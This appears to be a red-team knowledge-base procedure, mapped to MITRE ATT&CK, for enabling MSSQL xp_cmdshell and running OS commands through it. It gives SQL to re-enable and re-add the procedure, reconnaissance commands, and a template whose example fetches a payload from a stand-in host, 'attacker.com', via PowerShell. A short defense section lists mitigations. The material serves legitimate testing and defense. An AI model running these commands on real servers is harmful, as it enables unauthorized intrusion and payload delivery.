---
id: 59fdffc4-8dad-4e13-9cc6-94f11fd4fe80
name: Command-Execution-via-xp-cmdshell-MSSQL-Server
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:20.271553+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/DLL-Side-Loading|T1073 - DLL Side-Loading]]'
sub_techniques: []
tags:
  - '[[tags/Command-Execution-via-xp-cmdshell]]'
  - '[[tags/MSSQL-Server]]'
commands:
  - '[[commands/enable-xp-cmdshell-mssql]]'
  - '[[commands/execute-command-via-xp-cmdshell-mssql]]'
platforms:
  - Windows
  - SQL Server
tools: []
validated: true
---

# Command-Execution-via-xp-cmdshell-MSSQL-Server

## Summary

This procedure enables and utilizes the xp_cmdshell extended stored procedure in Microsoft SQL Server to execute arbitrary operating system commands on the underlying Windows host. It allows attackers with SQL access to run shell commands under the privileges of the SQL Server service account, facilitating reconnaissance, privilege escalation, or lateral movement in a network environment.

## Description

xp_cmdshell is a built-in extended stored procedure in SQL Server that bridges T-SQL execution with the Windows command shell (cmd.exe), enabling direct OS command execution from within SQL queries. By default, it is disabled for security reasons since SQL Server 2005, but can be re-enabled via configuration changes or by adding the procedure if removed. Once active, attackers can inject commands to perform actions like user enumeration, directory listing, network testing, or even downloading and executing payloads. This technique is particularly dangerous in environments where SQL Server runs with high-privilege service accounts (e.g., LocalSystem or domain admin), as it bypasses typical SQL isolation. It maps to execution tactics by leveraging command-line interfaces and can evade defenses if logging is not enabled. Prerequisites include authenticated SQL access with sysadmin privileges. Success enables shell access equivalent to the SQL service context, often leading to full system compromise.

## Requirements

1. Authenticated access to the Microsoft SQL Server instance with sysadmin role privileges.
2. SQL Server Management Studio (SSMS) or a SQL client like sqlcmd for query execution.
3. The SQL Server service account must have permissions to execute OS commands (typically the case unless restricted).
4. Optional: Access to the xplog70.dll file if xp_cmdshell has been completely removed.

## Defense

- Disable xp_cmdshell entirely using sp_configure 'xp_cmdshell', 0; RECONFIGURE; and monitor for re-enablement attempts.
- Restrict sysadmin role to only necessary personnel and use least-privilege service accounts for SQL Server.
- Enable SQL Server auditing for configuration changes and extended procedure executions; monitor Windows event logs for cmd.exe spawns from sqlservr.exe.
- Implement application whitelisting to block unauthorized command execution and use tools like AppLocker or WDAC.

## Objectives

1. Enable xp_cmdshell if disabled to allow OS command execution from SQL.
2. Execute reconnaissance commands to gather system information (users, directories, network).
3. Leverage executed commands for further compromise, such as privilege escalation or data exfiltration.

## Instructions

### Step 1: Verify and Enable xp_cmdshell

**Context**: xp_cmdshell is disabled by default. This step checks its status and enables it using configuration options, allowing subsequent command execution. This requires sysadmin privileges and applies changes server-wide.

**Command** ([[commands/enable-xp-cmdshell-mssql]]):
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

> This sequence first enables advanced configuration visibility, reapplies changes, then activates xp_cmdshell and reapplies. Expected output is a confirmation message like "Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install." Verify with SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'; which should return 1.

### Step 2: Add xp_cmdshell Extended Procedure if Removed

**Context**: If xp_cmdshell has been fully removed (e.g., via dropping the procedure), recreate it by adding the extended procedure pointing to the required DLL. This step is conditional and only needed if enabling fails due to missing procedure.

**Code** ([[codes/add-xp-cmdshell-extended-procedure-mssql]]):
```sql
sp_addextendedproc 'xp_cmdshell', 'xplog70.dll';
```

> Execute this in the master database context. Expected output is "'xp_cmdshell' extended procedure added to master database." The DLL must be in the SQL Server bin directory (e.g., C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn). Grant execute permissions with GRANT EXECUTE ON xp_cmdshell TO [user]; if needed.

### Step 3: Execute Reconnaissance Commands via xp_cmdshell

**Context**: With xp_cmdshell enabled, run sample commands to gather initial system intelligence. This demonstrates basic usage and verifies shell access, revealing user accounts, current context, file structure, and network reachability.

**Code** ([[codes/mssql-xp-cmdshell-recon-commands]]):
```sql
EXEC xp_cmdshell "net user"; EXEC master..xp_cmdshell 'whoami'; EXEC master.dbo.xp_cmdshell 'cmd.exe /c dir c:\'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

> This multi-statement query executes four commands: lists local users, shows current SQL service account, directories C:\, and pings localhost. Expected output includes tabular results for each, such as user lists from 'net user', the service account (e.g., "nt service\mssqlserver"), directory contents, and ping success (e.g., "Reply from 127.0.0.1: bytes=32 time<1ms TTL=128"). Errors indicate permission issues or disablement.

### Step 4: Execute Arbitrary OS Commands

**Context**: For custom actions beyond recon, use xp_cmdshell to run any valid Windows command. This step provides a generic template for targeted executions like downloading tools or escalating privileges.

**Command** ([[commands/execute-command-via-xp-cmdshell-mssql]]):
```sql
EXEC xp_cmdshell '$_COMMAND_TO_EXECUTE';
```

> Replace $_COMMAND_TO_EXECUTE with the desired shell command (e.g., 'powershell -c Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\temp\payload.exe'). Expected output is the command's stdout/stderr piped back as SQL result sets. Use master.dbo.xp_cmdshell for consistency if needed. Monitor for command injection risks in dynamic queries.
